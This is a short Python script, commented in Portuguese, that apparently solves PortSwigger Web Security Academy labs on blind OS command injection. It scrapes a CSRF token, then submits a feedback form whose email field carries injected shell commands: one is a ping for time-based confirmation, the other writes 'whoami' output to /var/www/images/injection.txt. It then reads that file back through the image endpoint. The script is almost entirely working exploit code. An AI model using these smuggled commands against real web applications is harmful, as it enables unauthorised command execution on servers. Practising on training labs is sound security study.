import requests
from bs4 import BeautifulSoup

s = requests.Session()
url = "https://0a7d00400337a86380ae5d9700a9000f.web-security-academy.net"

# GET na página de feedback
response = s.get(url=f"{url}/feedback")

# Capturando CSRF
soup = BeautifulSoup(response.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'})['value']

# PAYLOADS
# LAB 02
payload_1 = "& ping -c 10 127.0.0.1 &"
# LAB 03
payload_2 = "& whoami > /var/www/images/injection.txt &"

# POST para submit do feedback 
data = {
    "csrf": csrf,
    "name": "peter", 
    "email": f"email@email {payload_1}", 
    "subject": "shell", 
    "message": "command_injection"
}

response = s.post(url=f"{url}/feedback/submit", data=data)

# Saída para confirmação do LAB 02
# print(f"{response.elapsed.seconds} segundos")

params = {
    "filename": "injection.txt"
}
response = s.get(url=f"{url}/image", params=params)
print(response.text)